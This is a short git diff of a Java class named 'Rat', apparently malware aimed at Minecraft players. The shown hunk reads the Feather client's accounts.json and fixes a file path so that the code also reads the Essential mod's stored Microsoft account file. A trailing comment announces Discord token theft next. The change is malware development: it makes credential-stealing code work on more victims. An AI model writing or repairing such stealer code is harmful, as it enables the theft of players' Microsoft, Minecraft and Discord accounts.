@@ -47,8 +47,8 @@ public class Rat { //change class name please for the love of god
                     feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
                 }
 
-                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json"))) {
-                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json")).toString();
+                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json"))) {
+                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essential/microsoft_accounts.json")).toString();
                 }
 
                 //discord tokens
